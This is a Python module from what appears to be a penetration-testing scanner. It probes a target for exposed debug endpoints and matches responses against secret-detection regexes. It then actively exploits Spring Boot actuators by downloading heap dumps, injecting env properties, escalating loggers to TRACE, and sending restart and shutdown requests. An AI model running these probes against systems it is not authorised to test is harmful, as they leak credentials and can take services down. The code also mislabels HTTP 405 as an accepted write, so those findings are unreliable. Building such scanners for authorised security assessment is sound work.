"""Debug and actuator endpoint discovery and exploitation (MCP-T07).

Probes the target's base URL for exposed debug/admin endpoints
that leak configuration, credentials, or internal state.

Phase 1 (passive): HTTP GET probes for well-known debug endpoints.
Phase 2 (active):  POST-based exploitation probes for Spring Boot
                   actuator endpoints that accept writes — env injection,
                   logger level override, heap dump, shutdown/restart.
                   Active probes only fire if a passive probe confirms
                   the corresponding endpoint is present and reachable.
"""

import re

import httpx

from mcpnuke.core.models import TargetResult
from mcpnuke.checks.base import time_check

DEBUG_ENDPOINTS = [
    ("/actuator/env", "CRITICAL", "Spring Boot actuator env — may expose secrets and config"),
    ("/actuator/beans", "HIGH", "Spring Boot actuator beans — application context"),
    ("/actuator/configprops", "HIGH", "Spring Boot config properties"),
    ("/actuator/mappings", "HIGH", "Spring Boot request mappings"),
    ("/actuator/loggers", "MEDIUM", "Spring Boot logger configuration"),
    ("/actuator/health", "MEDIUM", "Spring Boot health endpoint"),
    ("/actuator/info", "MEDIUM", "Spring Boot info endpoint"),
    ("/actuator/heapdump", "CRITICAL", "Spring Boot heap dump — may contain in-memory secrets"),
    ("/actuator/threaddump", "MEDIUM", "Spring Boot thread dump"),
    ("/actuator/httptrace", "HIGH", "Spring Boot HTTP trace — recent requests and headers"),
    ("/actuator/scheduledtasks", "MEDIUM", "Spring Boot scheduled tasks"),
    ("/console", "CRITICAL", "Flask/Werkzeug debug console"),
    ("/_debug", "HIGH", "Debug endpoint"),
    ("/debug/vars", "HIGH", "Go expvar debug endpoint"),
    ("/debug/pprof", "HIGH", "Go pprof profiling endpoint"),
    ("/swagger-ui.html", "MEDIUM", "Swagger UI"),
    ("/swagger-ui/", "MEDIUM", "Swagger UI"),
    ("/openapi.json", "MEDIUM", "OpenAPI spec"),
    ("/graphiql", "MEDIUM", "GraphiQL interactive console"),
    ("/.env", "CRITICAL", "Exposed .env file"),
    ("/server-info", "HIGH", "Server info endpoint"),
    ("/phpinfo.php", "HIGH", "PHP info page"),
    ("/elmah.axd", "HIGH", "ASP.NET error log"),
]

SENSITIVE_CONTENT_PATTERNS = [
    r"(?:password|passwd|secret|credential|private.?key)\s*[:=]",
    r"(?:AKIA|sk-|ghp_|gho_|xox[bpsar]-)",
    r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
    r"(?:postgres|mysql|mongodb|redis)://\w+:\w+@",
    r"(?:DATABASE_URL|SECRET_KEY|API_KEY|AWS_SECRET)\s*=",
]

# Spring Boot actuator POST exploitation probes.
# Each entry: (path, method, payload, description, severity)
# Active probes are only attempted when the corresponding GET endpoint
# returns 200 during passive discovery.
_ACTUATOR_WRITE_PROBES = [
    (
        "/actuator/env",
        "POST",
        {"name": "mcpnuke.probe", "value": "1"},
        "Spring env write — can inject arbitrary config properties into the running process",
        "CRITICAL",
    ),
    (
        "/actuator/loggers/ROOT",
        "POST",
        {"configuredLevel": "TRACE"},
        "Spring logger override — escalating ROOT to TRACE can expose secrets in future log output",
        "HIGH",
    ),
    (
        "/actuator/loggers/org.springframework.security",
        "POST",
        {"configuredLevel": "TRACE"},
        "Spring security logger override — exposes auth decisions and token details at TRACE level",
        "HIGH",
    ),
    (
        "/actuator/refresh",
        "POST",
        {},
        "Spring config refresh — forces a config reload, can re-read attacker-controlled config sources",
        "HIGH",
    ),
    (
        "/actuator/restart",
        "POST",
        {},
        "Spring actuator restart — restarts the application context, disrupts service",
        "HIGH",
    ),
    (
        "/actuator/shutdown",
        "POST",
        {},
        "Spring actuator shutdown — shuts down the application process",
        "CRITICAL",
    ),
]

_ACTUATOR_HEAPDUMP_PATH = "/actuator/heapdump"


def check_actuator_probe(base_url: str, result: TargetResult, auth_token: str | None = None):
    """Probe for exposed debug/admin endpoints on the target's base URL."""
    with time_check("actuator_probe", result):
        headers = {}
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"

        client = httpx.Client(verify=False, timeout=5, follow_redirects=True)
        reachable_actuator_paths: set[str] = set()
        try:
            for path, default_sev, description in DEBUG_ENDPOINTS:
                url = base_url.rstrip("/") + path
                try:
                    r = client.get(url, headers=headers)
                    if r.status_code != 200:
                        continue
                    text = r.text[:5000]
                    ct = r.headers.get("content-type", "")
                    if not ("json" in ct or "html" in ct or "text" in ct):
                        continue

                    has_sensitive = any(
                        re.search(pat, text, re.IGNORECASE)
                        for pat in SENSITIVE_CONTENT_PATTERNS
                    )

                    severity = "CRITICAL" if has_sensitive else default_sev
                    result.add(
                        "actuator_probe",
                        severity,
                        f"Exposed endpoint: {path}",
                        f"{description}. {'Contains sensitive data.' if has_sensitive else ''}",
                        evidence=text[:300],
                    )
                    reachable_actuator_paths.add(path)
                except Exception:
                    pass
        finally:
            client.close()

        # Active exploitation probes — only attempt when passive probe
        # confirms at least one Spring actuator is exposed
        if any(p.startswith("/actuator/") for p in reachable_actuator_paths):
            _check_actuator_exploitation(
                base_url, result, headers, reachable_actuator_paths
            )


def _check_actuator_exploitation(
    base_url: str,
    result: TargetResult,
    headers: dict,
    reachable_paths: set[str],
) -> None:
    """Active POST-based exploitation probes for Spring Boot actuators.

    Only runs when passive discovery has confirmed at least one actuator
    endpoint is reachable. Probes are ordered by severity — env write
    and shutdown come last to avoid disrupting the target before other
    probes complete.
    """
    client = httpx.Client(verify=False, timeout=5, follow_redirects=True)
    try:
        # Heap dump — GET probe (binary response, checked separately)
        if _ACTUATOR_HEAPDUMP_PATH in reachable_paths:
            url = base_url.rstrip("/") + _ACTUATOR_HEAPDUMP_PATH
            try:
                r = client.get(url, headers=headers, timeout=10)
                if r.status_code == 200 and len(r.content) > 1024:
                    size_kb = len(r.content) // 1024
                    result.add(
                        "actuator_exploitation",
                        "CRITICAL",
                        "Spring actuator heapdump download succeeded",
                        (
                            f"Heap dump downloaded ({size_kb} KB). "
                            "JVM heap may contain in-memory secrets, credentials, "
                            "session tokens, and private key material."
                        ),
                        evidence=f"heapdump size={size_kb}KB",
                    )
            except Exception:
                pass

        # POST write probes — skip shutdown (last) unless non-shutdown probes
        # have already confirmed a write-enabled actuator
        write_succeeded = False
        for path, method, payload, description, severity in _ACTUATOR_WRITE_PROBES:
            # Don't attempt shutdown unless we already confirmed write access
            if path == "/actuator/shutdown" and not write_succeeded:
                continue

            url = base_url.rstrip("/") + path
            try:
                r = client.request(
                    method,
                    url,
                    json=payload,
                    headers={**headers, "Content-Type": "application/json"},
                )
                # 200, 204, or 400 (accepted but rejected param) all indicate
                # the endpoint accepted a write request
                if r.status_code in (200, 204, 400, 405):
                    accepted = r.status_code != 405
                    if accepted:
                        write_succeeded = True
                    result.add(
                        "actuator_exploitation",
                        severity if accepted else "MEDIUM",
                        f"Spring actuator write probe: {path}",
                        (
                            f"{description}. "
                            f"POST returned HTTP {r.status_code} — "
                            f"{'endpoint accepted write' if accepted else 'method allowed, param rejected'}."
                        ),
                        evidence=r.text[:300],
                    )
            except Exception:
                pass
    finally:
        client.close()

